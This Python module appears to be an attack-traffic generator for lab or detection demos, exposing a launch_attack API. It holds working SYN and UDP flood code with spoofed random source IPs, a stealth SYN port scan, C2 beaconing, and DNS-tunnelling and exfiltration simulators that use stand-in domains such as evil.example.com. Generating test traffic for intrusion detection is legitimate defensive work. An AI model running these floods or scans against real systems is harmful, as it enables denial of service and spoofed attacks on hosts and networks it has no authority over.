"""
Standalone attack generation functions for lab / demo use.

Each function sends real network traffic using scapy when available,
or logs and skips when scapy is not installed.

LAB / DEMO USE ONLY -- do not target systems you do not own or
have explicit written permission to test.
"""

import logging
import random
import socket
import struct
import threading
import time
from typing import Optional

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Scapy availability check
# ---------------------------------------------------------------------------

def _scapy_available() -> bool:
    """Return True if scapy is importable."""
    try:
        import scapy.all  # noqa: F401
        return True
    except (ImportError, OSError):
        return False


_HAS_SCAPY = _scapy_available()

if _HAS_SCAPY:
    from scapy.all import IP, TCP, UDP, send, sr1  # noqa: E402
    logger.info("[attack_tools] Scapy available -- real packet crafting enabled")
else:
    logger.warning(
        "[attack_tools] Scapy not installed -- attacks will log-and-skip. "
        "Install scapy (pip install scapy) for real traffic generation."
    )

# ---------------------------------------------------------------------------
# Shared helpers
# ---------------------------------------------------------------------------

def _random_external_ip() -> str:
    """Return a random non-private IPv4 address (spoofed source)."""
    while True:
        octets = [random.randint(1, 223) for _ in range(4)]
        if octets[0] == 10:
            continue
        if octets[0] == 172 and 16 <= octets[1] <= 31:
            continue
        if octets[0] == 192 and octets[1] == 168:
            continue
        if octets[0] == 127:
            continue
        return ".".join(str(o) for o in octets)


def _random_port() -> int:
    """Return a random ephemeral port."""
    return random.randint(1024, 65535)


def _checksum(data: bytes) -> int:
    """Compute ICMP/TCP/UDP checksum."""
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack("!" + "H" * (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return (~s) & 0xFFFF


def _run_in_thread(func, **kwargs) -> str:
    """Run an attack function in a daemon thread and return immediately."""
    stop_event = threading.Event()
    kwargs.setdefault("stop_event", stop_event)

    def _runner() -> None:
        try:
            func(**kwargs)
        except Exception as exc:
            logger.error("[attack_tools] %s error: %s", func.__name__, exc)

    t = threading.Thread(target=_runner, daemon=True, name=f"attack-{func.__name__}")
    t.start()
    return f"launched:{func.__name__}"


# ---------------------------------------------------------------------------
# Attack: SYN Flood
# ---------------------------------------------------------------------------

def syn_flood(target_ip: str, duration: float = 10.0) -> str:
    """Send TCP SYN packets to target_ip for duration seconds.

    Uses scapy for proper packet crafting when available; falls back
    to raw-socket SYN storms; falls back to log-and-skip when neither
    is possible (e.g., no admin privileges).

    Args:
        target_ip: Destination IP address.
        duration: Attack duration in seconds.

    Returns:
        Status string describing the result.
    """
    logger.info("[attack_tools] SYN flood -> %s (%.1fs)", target_ip, duration)

    if _HAS_SCAPY:
        return _syn_flood_scapy(target_ip, duration)

    # Raw-socket fallback
    try:
        return _syn_flood_raw(target_ip, duration)
    except PermissionError:
        logger.warning(
            "[attack_tools] SYN flood skipped -- no raw-socket permission "
            "and scapy not available"
        )
        return "skipped:no_permission"


def _syn_flood_scapy(target_ip: str, duration: float) -> str:
    """Scapy-based SYN flood."""
    sent = 0
    start = time.time()
    rate = 500
    try:
        while time.time() - start < duration:
            pkt = IP(src=_random_external_ip(), dst=target_ip) / TCP(
                dport=random.choice([80, 443, 22, 3389, 8080]),
                sport=_random_port(),
                flags="S",
                seq=random.randint(0, 0xFFFFFFFF),
            )
            send(pkt, verbose=False)
            sent += 1
            time.sleep(1.0 / max(rate, 1))
    except Exception as exc:
        logger.error("[attack_tools][scapy] SYN flood error: %s", exc)
    logger.info("[attack_tools][scapy] SYN flood complete: %d packets", sent)
    return f"scapy_syn_flood:{sent}pkts"


def _syn_flood_raw(target_ip: str, duration: float) -> str:
    """Raw-socket SYN flood fallback."""
    sent = 0
    target_port = 80
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        start = time.time()
        while time.time() - start < duration:
            src_ip = _random_external_ip()
            src_port = _random_port()
            ip_header = struct.pack(
                "!BBHHHBBH4s4s",
                (4 << 4) + 5, 0, 40, random.randint(0, 65535),
                0, 64, socket.IPPROTO_TCP, 0,
                socket.inet_aton(src_ip), socket.inet_aton(target_ip),
            )
            tcp_header = struct.pack(
                "!HHLLBBHHH",
                src_port, target_port, random.randint(0, 0xFFFFFFFF), 0,
                (5 << 4), 0x02, random.randint(1024, 65535), 0, 0,
            )
            sock.sendto(ip_header + tcp_header, (target_ip, target_port))
            sent += 1
            time.sleep(0.002)
        sock.close()
    except PermissionError:
        # connect() storm fallback
        start = time.time()
        while time.time() - start < duration:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect((target_ip, target_port))
                s.close()
                sent += 1
            except (ConnectionRefusedError, ConnectionAbortedError, TimeoutError, OSError):
                sent += 1
            time.sleep(0.002)
    logger.info("[attack_tools] SYN flood complete: %d packets", sent)
    return f"raw_syn_flood:{sent}pkts"


# ---------------------------------------------------------------------------
# Attack: UDP Flood
# ---------------------------------------------------------------------------

def udp_flood(target_ip: str, duration: float = 10.0) -> str:
    """Send a flood of UDP datagrams to target_ip for duration seconds.

    Args:
        target_ip: Destination IP address.
        duration: Attack duration in seconds.

    Returns:
        Status string describing the result.
    """
    logger.info("[attack_tools] UDP flood -> %s (%.1fs)", target_ip, duration)

    if _HAS_SCAPY:
        return _udp_flood_scapy(target_ip, duration)

    try:
        return _udp_flood_socket(target_ip, duration)
    except Exception as exc:
        logger.warning("[attack_tools] UDP flood skipped: %s", exc)
        return f"skipped:{exc}"


def _udp_flood_scapy(target_ip: str, duration: float) -> str:
    """Scapy-based UDP flood."""
    sent = 0
    start = time.time()
    rate = 500
    try:
        while time.time() - start < duration:
            pkt = IP(src=_random_external_ip(), dst=target_ip) / UDP(
                dport=random.randint(1, 65535),
                sport=_random_port(),
            ) / (b"\x00" * random.randint(64, 1400))
            send(pkt, verbose=False)
            sent += 1
            time.sleep(1.0 / max(rate, 1))
    except Exception as exc:
        logger.error("[attack_tools][scapy] UDP flood error: %s", exc)
    logger.info("[attack_tools][scapy] UDP flood complete: %d datagrams", sent)
    return f"scapy_udp_flood:{sent}pkts"


def _udp_flood_socket(target_ip: str, duration: float) -> str:
    """Socket-based UDP flood fallback."""
    sent = 0
    payload = b"\x00" * random.randint(64, 1400)
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        start = time.time()
        while time.time() - start < duration:
            try:
                sock.sendto(payload, (target_ip, random.randint(1, 65535)))
                sent += 1
            except OSError:
                pass
            time.sleep(0.002)
        sock.close()
    except Exception as exc:
        logger.error("[attack_tools] UDP flood error: %s", exc)
    logger.info("[attack_tools] UDP flood complete: %d datagrams", sent)
    return f"socket_udp_flood:{sent}pkts"


# ---------------------------------------------------------------------------
# Attack: C2 Beaconing
# ---------------------------------------------------------------------------

def c2_beacon_sim(target_ip: str, interval: float = 2.0, duration: float = 15.0) -> str:
    """Simulate C2 beaconing with periodic TCP connections.

    Opens TCP connections to target_ip at the given interval for the
    specified duration, mimicking a command-and-control heartbeat.

    Args:
        target_ip: C2 server IP address.
        interval: Seconds between beacons.
        duration: Total beaconing duration in seconds.

    Returns:
        Status string describing the result.
    """
    logger.info(
        "[attack_tools] C2 beaconing -> %s every %.1fs for %.1fs",
        target_ip, interval, duration,
    )

    if _HAS_SCAPY:
        return _c2_beacon_scapy(target_ip, interval, duration)

    try:
        return _c2_beacon_socket(target_ip, interval, duration)
    except Exception as exc:
        logger.warning("[attack_tools] C2 beaconing skipped: %s", exc)
        return f"skipped:{exc}"


def _c2_beacon_scapy(target_ip: str, interval: float, duration: float) -> str:
    """Scapy-based beacon -- sends periodic SYN packets."""
    beacons = 0
    start = time.time()
    try:
        while time.time() - start < duration:
            pkt = IP(src=_random_external_ip(), dst=target_ip) / TCP(
                dport=random.choice([443, 8080, 53, 4443]),
                sport=_random_port(),
                flags="S",
            )
            send(pkt, verbose=False)
            beacons += 1
            time.sleep(interval)
    except Exception as exc:
        logger.error("[attack_tools][scapy] C2 beaconing error: %s", exc)
    logger.info("[attack_tools][scapy] C2 beaconing complete: %d beacons", beacons)
    return f"scapy_c2_beacon:{beacons}beacons"


def _c2_beacon_socket(target_ip: str, interval: float, duration: float) -> str:
    """Socket-based beacon fallback."""
    beacons = 0
    end_time = time.time() + duration
    try:
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect((target_ip, random.choice([443, 8080, 53, 4443])))
                s.send(b"\x00" * 16)
                s.close()
            except (ConnectionRefusedError, ConnectionAbortedError, TimeoutError, OSError):
                pass
            beacons += 1
            time.sleep(interval)
    except Exception as exc:
        logger.error("[attack_tools] C2 beaconing error: %s", exc)
    logger.info("[attack_tools] C2 beaconing complete: %d beacons", beacons)
    return f"socket_c2_beacon:{beacons}beacons"


# ---------------------------------------------------------------------------
# Attack: DNS Tunneling
# ---------------------------------------------------------------------------

def dns_tunnel_sim(target_ip: str, duration: float = 8.0) -> str:
    """Send crafted DNS queries with long subdomain labels to simulate
    DNS tunneling / DGA-based exfiltration.

    Args:
        target_ip: DNS server IP address.
        duration: Attack duration in seconds.

    Returns:
        Status string describing the result.
    """
    logger.info("[attack_tools] DNS tunnel -> %s (%.1fs)", target_ip, duration)

    if _HAS_SCAPY:
        return _dns_tunnel_scapy(target_ip, duration)

    try:
        return _dns_tunnel_socket(target_ip, duration)
    except Exception as exc:
        logger.warning("[attack_tools] DNS tunnel skipped: %s", exc)
        return f"skipped:{exc}"


def _dns_tunnel_scapy(target_ip: str, duration: float) -> str:
    """Scapy-based DNS tunnel -- sends DNS queries with long subdomains."""
    sent = 0
    start = time.time()
    try:
        while time.time() - start < duration:
            tunnel_data = "".join(
                random.choice("abcdef0123456789") for _ in range(200)
            )
            domain = f"{tunnel_data[:63]}.example.com"
            qname = (
                b"".join(bytes([len(p)]) + p.encode() for p in domain.split("."))
                + b"\x00"
            )
            dns_query = (
                struct.pack("!HHHHHH", random.randint(0, 65535), 0x0100, 1, 0, 0, 0)
                + qname
                + struct.pack("!HH", 1, 1)
            )
            pkt = IP(src=_random_external_ip(), dst=target_ip) / UDP(
                dport=53, sport=_random_port(),
            ) / dns_query
            send(pkt, verbose=False)
            sent += 1
            time.sleep(0.02)
    except Exception as exc:
        logger.error("[attack_tools][scapy] DNS tunnel error: %s", exc)
    logger.info("[attack_tools][scapy] DNS tunnel complete: %d queries", sent)
    return f"scapy_dns_tunnel:{sent}queries"


def _dns_tunnel_socket(target_ip: str, duration: float) -> str:
    """Socket-based DNS tunnel fallback."""
    sent = 0
    suspicious_domains = [
        "a1b2c3d4.evil.example.com",
        "xYz.malware-c2.net",
        "longsubdomain.bigger.longer.suspicious.example.org",
        "a" * 30 + ".exfil.example.com",
        "beacon." + "x" * 20 + ".c2.net",
    ]
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(1.0)
        start = time.time()
        while time.time() - start < duration:
            domain = random.choice(suspicious_domains)
            dns_header = struct.pack(
                "!HHHHHH",
                random.randint(0, 65535), 0x0100, 1, 0, 0, 0,
            )
            qname = (
                b"".join(bytes([len(p)]) + p.encode() for p in domain.split("."))
                + b"\x00"
            )
            qtype_qclass = struct.pack("!HH", 1, 1)
            try:
                sock.sendto(dns_header + qname + qtype_qclass, (target_ip, 53))
                sent += 1
            except OSError:
                pass
            time.sleep(0.02)
        sock.close()
    except Exception as exc:
        logger.error("[attack_tools] DNS tunnel error: %s", exc)
    logger.info("[attack_tools] DNS tunnel complete: %d queries", sent)
    return f"socket_dns_tunnel:{sent}queries"


# ---------------------------------------------------------------------------
# Attack: Port Scan
# ---------------------------------------------------------------------------

def port_scan(target_ip: str, ports: Optional[list] = None) -> str:
    """Scan a list of ports on target_ip to simulate reconnaissance.

    Args:
        target_ip: Target host IP address.
        ports: List of port numbers to scan.  Defaults to a common
            service port list: [22, 80, 443, 3306, 5432, 8080, 8443, 3000].

    Returns:
        Status string describing the result.
    """
    if ports is None:
        ports = [22, 80, 443, 3306, 5432, 8080, 8443, 3000]

    logger.info("[attack_tools] Port scan -> %s ports=%s", target_ip, ports)

    if _HAS_SCAPY:
        return _port_scan_scapy(target_ip, ports)

    try:
        return _port_scan_socket(target_ip, ports)
    except Exception as exc:
        logger.warning("[attack_tools] Port scan skipped: %s", exc)
        return f"skipped:{exc}"


def _port_scan_scapy(target_ip: str, ports: list) -> str:
    """Scapy-based SYN port scan (stealth half-open)."""
    scanned = 0
    try:
        for port in ports:
            pkt = IP(dst=target_ip) / TCP(dport=port, flags="S")
            resp = sr1(pkt, timeout=0.5, verbose=False)
            scanned += 1
    except Exception as exc:
        logger.error("[attack_tools][scapy] Port scan error: %s", exc)
    logger.info(
        "[attack_tools][scapy] Port scan complete: %d/%d ports",
        scanned, len(ports),
    )
    return f"scapy_port_scan:{scanned}/{len(ports)}ports"


def _port_scan_socket(target_ip: str, ports: list) -> str:
    """Socket-based connect() port scan fallback."""
    scanned = 0
    try:
        for port in ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.8)
                s.connect((target_ip, port))
                s.close()
            except (ConnectionRefusedError, ConnectionAbortedError, TimeoutError, OSError):
                pass
            scanned += 1
            time.sleep(0.3)
        # Re-scan first 5 ports quickly (rapid re-scan pattern)
        for port in ports[:5]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.3)
                s.connect((target_ip, port))
                s.close()
            except (ConnectionRefusedError, ConnectionAbortedError, TimeoutError, OSError):
                pass
            scanned += 1
            time.sleep(0.1)
    except Exception as exc:
        logger.error("[attack_tools] Port scan error: %s", exc)
    logger.info("[attack_tools] Port scan complete: %d probes", scanned)
    return f"socket_port_scan:{scanned}probes"


# ---------------------------------------------------------------------------
# Attack: Data Exfiltration
# ---------------------------------------------------------------------------

def data_exfil_sim(target_ip: str, size_mb: float = 1.0) -> str:
    """Simulate data exfiltration by sending large payloads to target_ip.

    Args:
        target_ip: External exfiltration destination IP.
        size_mb: Approximate total data to send in megabytes.

    Returns:
        Status string describing the result.
    """
    logger.info("[attack_tools] Data exfil -> %s (%.1fMB)", target_ip, size_mb)

    if _HAS_SCAPY:
        return _data_exfil_scapy(target_ip, size_mb)

    try:
        return _data_exfil_socket(target_ip, size_mb)
    except Exception as exc:
        logger.warning("[attack_tools] Data exfil skipped: %s", exc)
        return f"skipped:{exc}"


def _data_exfil_scapy(target_ip: str, size_mb: float) -> str:
    """Scapy-based exfiltration -- sends large TCP payloads."""
    sent_bytes = 0
    chunks = 0
    chunk_size = 8192
    total_target = int(size_mb * 1024 * 1024)
    payload = b"\x00" * chunk_size
    start = time.time()
    try:
        while sent_bytes < total_target:
            pkt = IP(src=_random_external_ip(), dst=target_ip) / TCP(
                dport=random.choice([443, 8080, 53, 4443, 21]),
                sport=_random_port(),
                flags="PA",
            ) / payload
            send(pkt, verbose=False)
            sent_bytes += chunk_size
            chunks += 1
            time.sleep(0.05)
    except Exception as exc:
        logger.error("[attack_tools][scapy] Data exfil error: %s", exc)
    logger.info(
        "[attack_tools][scapy] Data exfil complete: %d chunks, ~%.1fMB",
        chunks, sent_bytes / 1024 / 1024,
    )
    return f"scapy_exfil:{chunks}chunks_{sent_bytes / 1024 / 1024:.1f}MB"


def _data_exfil_socket(target_ip: str, size_mb: float) -> str:
    """Socket-based exfiltration fallback."""
    sent_bytes = 0
    chunks = 0
    chunk_size = 8192
    total_target = int(size_mb * 1024 * 1024)
    payload = b"\x00" * chunk_size
    try:
        start = time.time()
        while sent_bytes < total_target:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2.0)
                s.connect((target_ip, random.choice([443, 8080, 53, 4443, 21])))
                s.sendall(payload)
                s.close()
                sent_bytes += chunk_size
                chunks += 1
            except (ConnectionRefusedError, ConnectionAbortedError, TimeoutError, OSError):
                sent_bytes += chunk_size
                chunks += 1
            time.sleep(0.05)
    except Exception as exc:
        logger.error("[attack_tools] Data exfil error: %s", exc)
    logger.info(
        "[attack_tools] Data exfil complete: %d chunks, ~%.1fMB",
        chunks, sent_bytes / 1024 / 1024,
    )
    return f"socket_exfil:{chunks}chunks_{sent_bytes / 1024 / 1024:.1f}MB"


# ---------------------------------------------------------------------------
# Public API -- run attacks in background threads
# ---------------------------------------------------------------------------

# Map user-facing attack type keys to functions
_ATTACK_FUNCS = {
    "syn_flood":      syn_flood,
    "udp_flood":      udp_flood,
    "c2_beaconing":   c2_beacon_sim,
    "dns_tunneling":  dns_tunnel_sim,
    "port_scan":      port_scan,
    "data_exfil":     data_exfil_sim,
}


def launch_attack(attack_type: str, target_ip: str = "127.0.0.1",
                  **kwargs) -> str:
    """Launch an attack in a background thread (non-blocking).

    Args:
        attack_type: One of the keys in _ATTACK_FUNCS.
        target_ip: Destination IP address.
        **kwargs: Additional args passed to the attack function
            (duration, interval, size_mb, ports, etc.).

    Returns:
        Status string, e.g. "launched:syn_flood" or "skipped:no_permission".
    """
    func = _ATTACK_FUNCS.get(attack_type)
    if not func:
        logger.warning("[attack_tools] Unknown attack type: %s", attack_type)
        return f"error:unknown_type:{attack_type}"

    kwargs["target_ip"] = target_ip
    return _run_in_thread(func, **kwargs)
